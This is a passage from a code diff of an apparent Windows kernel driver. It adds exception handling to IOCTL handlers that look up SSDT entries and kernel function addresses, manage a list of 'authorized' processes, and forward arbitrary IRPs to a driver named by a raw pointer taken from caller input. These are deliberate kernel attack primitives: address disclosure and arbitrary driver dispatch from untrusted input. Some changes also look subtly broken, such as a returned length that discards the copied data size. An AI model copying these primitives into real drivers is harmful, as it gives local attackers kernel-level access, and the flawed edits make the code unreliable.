+                            pEntry[idx].Name[nameLenChars] = L'\0';
+                        }
+                        __except (EXCEPTION_EXECUTE_HANDLER) {
+                            pEntry[idx].Name[0] = L'\0';
+                        }
+                        idx++;
+                        pList = pList->Flink;
+                    }
                 }
-                KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);
+                __finally {
+                    KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);
+                }
                 *Info = requiredSize;
                 return STATUS_SUCCESS;
             }
@@ -2214,13 +2381,23 @@ NTSTATUS R0SimulateGetKernelFunction(PVOID InputBuffer, ULONG InputSize,
                 PSSDT_ENTRY entry = NULL;
                 if (InputSize < sizeof(GET_KERNEL_FUNCTION_INPUT) + nameLen - 1) return STATUS_BUFFER_TOO_SMALL;
                 name = pIn->Name;
-                if (IsNumberString(name)) entry = FindSsdtBySsn(WcharToUlong(name));
-                else entry = FindSsdtByName(name);
+                __try {
+                    if (IsNumberString(name)) entry = FindSsdtBySsn(WcharToUlong(name));
+                    else entry = FindSsdtByName(name);
+                }
+                __except (EXCEPTION_EXECUTE_HANDLER) {
+                    return GetExceptionCode();
+                }
                 if (!entry) return STATUS_NOT_FOUND;
                 if (OutputSize >= sizeof(KERNEL_FUNCTION_ENTRY)) {
                     PKERNEL_FUNCTION_ENTRY pOut = (PKERNEL_FUNCTION_ENTRY)OutputBuffer;
-                    pOut->Address = entry->Address;
-                    R0sWcsCopyN(pOut->Name, entry->Name, 64);
+                    __try {
+                        pOut->Address = entry->Address;
+                        R0sWcsCopyN(pOut->Name, entry->Name, 64);
+                    }
+                    __except (EXCEPTION_EXECUTE_HANDLER) {
+                        return GetExceptionCode();
+                    }
                     *Info = sizeof(KERNEL_FUNCTION_ENTRY);
                     return STATUS_SUCCESS;
                 } else return STATUS_BUFFER_TOO_SMALL;
@@ -2232,28 +2409,43 @@ NTSTATUS R0SimulateGetKernelFunction(PVOID InputBuffer, ULONG InputSize,
                 ULONG idx;
 
                 KeAcquireSpinLock(&g_SsdtListLock, &oldIrql);
-                pList = g_SsdtListHead.Flink;
-                while (pList != &g_SsdtListHead) { count++; pList = pList->Flink; }
+                __try {
+                    pList = g_SsdtListHead.Flink;
+                    while (pList != &g_SsdtListHead) { count++; pList = pList->Flink; }
+                }
+                __except (EXCEPTION_EXECUTE_HANDLER) {
+                    KeReleaseSpinLock(&g_SsdtListLock, oldIrql);
+                    return GetExceptionCode();
+                }
                 KeReleaseSpinLock(&g_SsdtListLock, oldIrql);
 
                 required = sizeof(ULONG) + count * sizeof(SSDT_ENTRY_INFO);
                 if (OutputSize < required) { *Info = required; return STATUS_BUFFER_TOO_SMALL; }
 
-                *(ULONG*)OutputBuffer = count;
+                __try {
+                    *(ULONG*)OutputBuffer = count;
+                }
+                __except (EXCEPTION_EXECUTE_HANDLER) {
+                    return GetExceptionCode();
+                }
                 pOut = (PSSDT_ENTRY_INFO)((PUCHAR)OutputBuffer + sizeof(ULONG));
 
                 KeAcquireSpinLock(&g_SsdtListLock, &oldIrql);
-                pList = g_SsdtListHead.Flink;
-                idx = 0;
-                while (pList != &g_SsdtListHead && idx < count) {
-                    PSSDT_ENTRY e = CONTAINING_RECORD(pList, SSDT_ENTRY, ListEntry);
-                    pOut[idx].Ssn = e->Ssn;
-                    pOut[idx].Address = e->Address;
-                    R0sWcsCopyN(pOut[idx].Name, e->Name, 64);
-                    idx++;
-                    pList = pList->Flink;
+                __try {
+                    pList = g_SsdtListHead.Flink;
+                    idx = 0;
+                    while (pList != &g_SsdtListHead && idx < count) {
+                        PSSDT_ENTRY e = CONTAINING_RECORD(pList, SSDT_ENTRY, ListEntry);
+                        pOut[idx].Ssn = e->Ssn;
+                        pOut[idx].Address = e->Address;
+                        R0sWcsCopyN(pOut[idx].Name, e->Name, 64);
+                        idx++;
+                        pList = pList->Flink;
+                    }
                 }
-                KeReleaseSpinLock(&g_SsdtListLock, oldIrql);
+                __finally {
+                    KeReleaseSpinLock(&g_SsdtListLock, oldIrql);
+                }
                 *Info = required;
                 return STATUS_SUCCESS;
             }
@@ -2448,11 +2640,16 @@ NTSTATUS R0SimulateAuthorizedListOperations(PVOID InputBuffer, ULONG InputSize,
         if (!NT_SUCCESS(status)) return status;
 
         KeAcquireSpinLock(&g_AuthListLock, &oldIrql);
-        p = g_AuthListHead.Flink;
-        while (p != &g_AuthListHead) {
-            PAUTH_ENTRY e = CONTAINING_RECORD(p, AUTH_ENTRY, ListEntry);
-            if (e->Process == pTarget) { exists = TRUE; break; }
-            p = p->Flink;
+        __try {
+            p = g_AuthListHead.Flink;
+            while (p != &g_AuthListHead) {
+                PAUTH_ENTRY e = CONTAINING_RECORD(p, AUTH_ENTRY, ListEntry);
+                if (e->Process == pTarget) { exists = TRUE; break; }
+                p = p->Flink;
+            }
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            exists = FALSE;
         }
         KeReleaseSpinLock(&g_AuthListLock, oldIrql);
 
@@ -2465,11 +2662,24 @@ NTSTATUS R0SimulateAuthorizedListOperations(PVOID InputBuffer, ULONG InputSize,
         pEntry->Process = pTarget;
 
         KeAcquireSpinLock(&g_AuthListLock, &oldIrql);
-        InsertTailList(&g_AuthListHead, &pEntry->ListEntry);
+        __try {
+            InsertTailList(&g_AuthListHead, &pEntry->ListEntry);
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            KeReleaseSpinLock(&g_AuthListLock, oldIrql);
+            ObDereferenceObject(pTarget);
+            ExFreePoolWithTag(pEntry, 'AUTH');
+            return GetExceptionCode();
+        }
         KeReleaseSpinLock(&g_AuthListLock, oldIrql);
 
         if (OutputSize >= sizeof(NTSTATUS)) {
-            *(NTSTATUS*)OutputBuffer = STATUS_SUCCESS;
+            __try {
+                *(NTSTATUS*)OutputBuffer = STATUS_SUCCESS;
+            }
+            __except (EXCEPTION_EXECUTE_HANDLER) {
+                return GetExceptionCode();
+            }
             *Info = sizeof(NTSTATUS);
         }
         return STATUS_SUCCESS;
@@ -2481,21 +2691,36 @@ NTSTATUS R0SimulateAuthorizedListOperations(PVOID InputBuffer, ULONG InputSize,
         PLIST_ENTRY p;
 
         KeAcquireSpinLock(&g_AuthListLock, &oldIrql);
-        p = g_AuthListHead.Flink;
-        while (p != &g_AuthListHead) {
-            PAUTH_ENTRY e = CONTAINING_RECORD(p, AUTH_ENTRY, ListEntry);
-            if ((ULONG)(ULONG_PTR)e->Pid == pIn->Pid) { pEntry = e; break; }
-            p = p->Flink;
+        __try {
+            p = g_AuthListHead.Flink;
+            while (p != &g_AuthListHead) {
+                PAUTH_ENTRY e = CONTAINING_RECORD(p, AUTH_ENTRY, ListEntry);
+                if ((ULONG)(ULONG_PTR)e->Pid == pIn->Pid) { pEntry = e; break; }
+                p = p->Flink;
+            }
+            if (pEntry) RemoveEntryList(&pEntry->ListEntry);
         }
-        if (pEntry) RemoveEntryList(&pEntry->ListEntry);
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            pEntry = NULL;
+        }
         KeReleaseSpinLock(&g_AuthListLock, oldIrql);
 
         if (!pEntry) return STATUS_NOT_FOUND;
-        if (pEntry->Process) ObDereferenceObject(pEntry->Process);
-        ExFreePoolWithTag(pEntry, 'AUTH');
+
+        __try {
+            if (pEntry->Process) ObDereferenceObject(pEntry->Process);
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) { }
+        __try { ExFreePoolWithTag(pEntry, 'AUTH'); }
+        __except (EXCEPTION_EXECUTE_HANDLER) { }
 
         if (OutputSize >= sizeof(NTSTATUS)) {
-            *(NTSTATUS*)OutputBuffer = STATUS_SUCCESS;
+            __try {
+                *(NTSTATUS*)OutputBuffer = STATUS_SUCCESS;
+            }
+            __except (EXCEPTION_EXECUTE_HANDLER) {
+                return GetExceptionCode();
+            }
             *Info = sizeof(NTSTATUS);
         }
         return STATUS_SUCCESS;
@@ -2513,22 +2738,42 @@ NTSTATUS R0SimulateAuthorizedListOperations(PVOID InputBuffer, ULONG InputSize,
 
         maxCount = (OutputSize - FIELD_OFFSET(R0S_AUTH_LIST_OUTPUT, Entries)) / sizeof(R0S_AUTH_ENTRY_INFO);
         pOut = (PR0S_AUTH_LIST_OUTPUT)OutputBuffer;
-        pOut->Reserved = 0;
+
+        __try {
+            pOut->Reserved = 0;
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            return GetExceptionCode();
+        }
 
         KeAcquireSpinLock(&g_AuthListLock, &oldIrql);
-        p = g_AuthListHead.Flink;
-        while (p != &g_AuthListHead && count < maxCount) {
-            PAUTH_ENTRY e = CONTAINING_RECORD(p, AUTH_ENTRY, ListEntry);
-            pOut->Entries[count].Pid      = e->Pid;
-            pOut->Entries[count].Reserved = 0;
-            pOut->Entries[count].Valid    = (e->Process != NULL) ? 1 : 0;
-            RtlZeroMemory(pOut->Entries[count].Pad, sizeof(pOut->Entries[count].Pad));
-            count++;
-            p = p->Flink;
+        __try {
+            p = g_AuthListHead.Flink;
+            while (p != &g_AuthListHead && count < maxCount) {
+                PAUTH_ENTRY e = CONTAINING_RECORD(p, AUTH_ENTRY, ListEntry);
+                __try {
+                    pOut->Entries[count].Pid      = e->Pid;
+                    pOut->Entries[count].Reserved = 0;
+                    pOut->Entries[count].Valid    = (e->Process != NULL) ? 1 : 0;
+                    RtlZeroMemory(pOut->Entries[count].Pad, sizeof(pOut->Entries[count].Pad));
+                }
+                __except (EXCEPTION_EXECUTE_HANDLER) {
+                    break;
+                }
+                count++;
+                p = p->Flink;
+            }
         }
-        KeReleaseSpinLock(&g_AuthListLock, oldIrql);
+        __finally {
+            KeReleaseSpinLock(&g_AuthListLock, oldIrql);
+        }
 
-        pOut->Count = count;
+        __try {
+            pOut->Count = count;
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            return GetExceptionCode();
+        }
         required = FIELD_OFFSET(R0S_AUTH_LIST_OUTPUT, Entries) + count * sizeof(R0S_AUTH_ENTRY_INFO);
         *Info = required;
         return STATUS_SUCCESS;
@@ -2747,7 +2992,7 @@ NTSTATUS R0SimulateArbitraryDriverCall(PVOID InputBuffer, ULONG InputSize,
                                        PVOID OutputBuffer, ULONG OutputSize,
                                        ULONG_PTR *Info)
 {
-    NTSTATUS            status;
+    NTSTATUS            status = STATUS_SUCCESS;
     PR0S_CALL_DRIVER_INPUT  pIn;
     PR0S_CALL_DRIVER_OUTPUT pOut;
     PDRIVER_OBJECT      pDriver;
@@ -2766,104 +3011,115 @@ NTSTATUS R0SimulateArbitraryDriverCall(PVOID InputBuffer, ULONG InputSize,
     if (!OutputBuffer || OutputSize < sizeof(R0S_CALL_DRIVER_OUTPUT))
         return STATUS_BUFFER_TOO_SMALL;
 
-    
-    inputCopy = ExAllocatePoolWithTag(NonPagedPool, InputSize, 'IRPI');
-    if (!inputCopy) return STATUS_INSUFFICIENT_RESOURCES;
-    RtlCopyMemory(inputCopy, InputBuffer, InputSize);
+    __try {
+        inputCopy = ExAllocatePoolWithTag(NonPagedPool, InputSize, 'IRPI');
+        if (!inputCopy) return STATUS_INSUFFICIENT_RESOURCES;
+        RtlCopyMemory(inputCopy, InputBuffer, InputSize);
 
-    pIn  = (PR0S_CALL_DRIVER_INPUT)inputCopy;
-    pOut = (PR0S_CALL_DRIVER_OUTPUT)OutputBuffer;
-    RtlZeroMemory(pOut, sizeof(*pOut));
+        pIn  = (PR0S_CALL_DRIVER_INPUT)inputCopy;
+        pOut = (PR0S_CALL_DRIVER_OUTPUT)OutputBuffer;
+        RtlZeroMemory(pOut, sizeof(*pOut));
 
-    if (pIn->DriverObject == 0) {
-        ExFreePoolWithTag(inputCopy, 'IRPI');
-        return STATUS_INVALID_PARAMETER;
-    }
+        if (pIn->DriverObject == 0) {
+            ExFreePoolWithTag(inputCopy, 'IRPI');
+            return STATUS_INVALID_PARAMETER;
+        }
 
-    
-    if (InputSize < sizeof(R0S_CALL_DRIVER_INPUT) + pIn->InputLength - 1) {
-        ExFreePoolWithTag(inputCopy, 'IRPI');
-        return STATUS_BUFFER_TOO_SMALL;
-    }
+        if (InputSize < sizeof(R0S_CALL_DRIVER_INPUT) + pIn->InputLength - 1) {
+            ExFreePoolWithTag(inputCopy, 'IRPI');
+            return STATUS_BUFFER_TOO_SMALL;
+        }
 
-    pDriver = (PDRIVER_OBJECT)(ULONG_PTR)pIn->DriverObject;
-    pDevice = pDriver->DeviceObject;
-    if (!pDevice) {
-        ExFreePoolWithTag(inputCopy, 'IRPI');
-        return STATUS_INVALID_PARAMETER;
-    }
+        __try {
+            pDriver = (PDRIVER_OBJECT)(ULONG_PTR)pIn->DriverObject;
+            pDevice = pDriver->DeviceObject;
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            ExFreePoolWithTag(inputCopy, 'IRPI');
+            return GetExceptionCode();
+        }
 
-    isDeviceControl = (pIn->MajorFunction == IRP_MJ_DEVICE_CONTROL ||
-                       pIn->MajorFunction == IRP_MJ_INTERNAL_DEVICE_CONTROL);
+        if (!pDevice) {
+            ExFreePoolWithTag(inputCopy, 'IRPI');
+            return STATUS_INVALID_PARAMETER;
+        }
 
-    KeInitializeEvent(&event, NotificationEvent, FALSE);
+        isDeviceControl = (pIn->MajorFunction == IRP_MJ_DEVICE_CONTROL ||
+                           pIn->MajorFunction == IRP_MJ_INTERNAL_DEVICE_CONTROL);
 
-    pIrp = IoAllocateIrp(pDevice->StackSize, FALSE);
-    if (!pIrp) {
-        ExFreePoolWithTag(inputCopy, 'IRPI');
-        return STATUS_INSUFFICIENT_RESOURCES;
-    }
+        KeInitializeEvent(&event, NotificationEvent, FALSE);
 
-    if (pIn->InputLength > 0 || pIn->OutputLength > 0) {
-        ULONG bufLen = max(pIn->InputLength, pIn->OutputLength);
-        sysBuffer = ExAllocatePoolWithTag(NonPagedPool, bufLen, 'IRPB');
-        if (!sysBuffer) {
-            IoFreeIrp(pIrp);
+        pIrp = IoAllocateIrp(pDevice->StackSize, FALSE);
+        if (!pIrp) {
             ExFreePoolWithTag(inputCopy, 'IRPI');
             return STATUS_INSUFFICIENT_RESOURCES;
         }
-        RtlZeroMemory(sysBuffer, bufLen);
-        if (pIn->InputLength > 0) {
-            RtlCopyMemory(sysBuffer,
-                          (PUCHAR)pIn + sizeof(R0S_CALL_DRIVER_INPUT),
-                          pIn->InputLength);
+
+        if (pIn->InputLength > 0 || pIn->OutputLength > 0) {
+            ULONG bufLen = max(pIn->InputLength, pIn->OutputLength);
+            sysBuffer = ExAllocatePoolWithTag(NonPagedPool, bufLen, 'IRPB');
+            if (!sysBuffer) {
+                IoFreeIrp(pIrp);
+                ExFreePoolWithTag(inputCopy, 'IRPI');
+                return STATUS_INSUFFICIENT_RESOURCES;
+            }
+            RtlZeroMemory(sysBuffer, bufLen);
+            if (pIn->InputLength > 0) {
+                RtlCopyMemory(sysBuffer,
+                              (PUCHAR)pIn + sizeof(R0S_CALL_DRIVER_INPUT),
+                              pIn->InputLength);
+            }
+        }
+
+        pSp = IoGetNextIrpStackLocation(pIrp);
+        pSp->MajorFunction = (UCHAR)pIn->MajorFunction;
+        pSp->MinorFunction = (UCHAR)pIn->MinorFunction;
+        if (isDeviceControl) {
+            pSp->Parameters.DeviceIoControl.IoControlCode      = pIn->IoControlCode;
+            pSp->Parameters.DeviceIoControl.InputBufferLength  = pIn->InputLength;
+            pSp->Parameters.DeviceIoControl.OutputBufferLength = pIn->OutputLength;
+            pSp->Parameters.DeviceIoControl.Type3InputBuffer   = NULL;
+        }
+
+        pIrp->AssociatedIrp.SystemBuffer = sysBuffer;
+        pIrp->UserBuffer = sysBuffer;
+
+        IoSetCompletionRoutine(pIrp, R0sIrpCompletion, &event, TRUE, TRUE, TRUE);
+
+        __try {
+            status = IoCallDriver(pDevice, pIrp);
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            status = GetExceptionCode();
+        }
+
+        if (status == STATUS_PENDING) {
+            KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
+            status = pIrp->IoStatus.Status;
+        }
+
+        copyOut = pIrp->IoStatus.Information;
+        if (copyOut > pIn->OutputLength) copyOut = pIn->OutputLength;
+
+        pOut->Status      = status;
+        pOut->Information = copyOut;
+        pOut->Reserved    = 0;
+        if (copyOut > 0 && sysBuffer) {
+            if (OutputSize >= sizeof(R0S_CALL_DRIVER_OUTPUT) + copyOut) {
+                RtlCopyMemory(pOut->Data, sysBuffer, copyOut);
+            }
         }
     }
-
-    pSp = IoGetNextIrpStackLocation(pIrp);
-    pSp->MajorFunction = (UCHAR)pIn->MajorFunction;
-    pSp->MinorFunction = (UCHAR)pIn->MinorFunction;
-    if (isDeviceControl) {
-        pSp->Parameters.DeviceIoControl.IoControlCode      = pIn->IoControlCode;
-        pSp->Parameters.DeviceIoControl.InputBufferLength  = pIn->InputLength;
-        pSp->Parameters.DeviceIoControl.OutputBufferLength = pIn->OutputLength;
-        pSp->Parameters.DeviceIoControl.Type3InputBuffer   = NULL;
-    }
-
-    pIrp->AssociatedIrp.SystemBuffer = sysBuffer;
-    pIrp->UserBuffer = sysBuffer;
-
-    IoSetCompletionRoutine(pIrp, R0sIrpCompletion, &event, TRUE, TRUE, TRUE);
-
-    __try {
-        status = IoCallDriver(pDevice, pIrp);
-    } __except (EXCEPTION_EXECUTE_HANDLER) {
+    __except (EXCEPTION_EXECUTE_HANDLER) {
         status = GetExceptionCode();
     }
 
-    if (status == STATUS_PENDING) {
-        KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
-        status = pIrp->IoStatus.Status;
-    }
-
-    copyOut = pIrp->IoStatus.Information;
-    if (copyOut > pIn->OutputLength) copyOut = pIn->OutputLength;
-
-    pOut->Status      = status;
-    pOut->Information = copyOut;
-    pOut->Reserved    = 0;
-    if (copyOut > 0 && sysBuffer) {
-        if (OutputSize >= sizeof(R0S_CALL_DRIVER_OUTPUT) + copyOut) {
-            RtlCopyMemory(pOut->Data, sysBuffer, copyOut);
-        }
-    }
-
     if (sysBuffer) ExFreePoolWithTag(sysBuffer, 'IRPB');
-    IoFreeIrp(pIrp);
-    ExFreePoolWithTag(inputCopy, 'IRPI');
+    if (pIrp) IoFreeIrp(pIrp);
+    if (inputCopy) ExFreePoolWithTag(inputCopy, 'IRPI');
 
-    *Info = sizeof(R0S_CALL_DRIVER_OUTPUT) + copyOut;
-    return STATUS_SUCCESS;
+    *Info = sizeof(R0S_CALL_DRIVER_OUTPUT) + ((status == STATUS_SUCCESS) ? 0 : 0);
+    return status;
 }
 
 NTSTATUS DriverDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
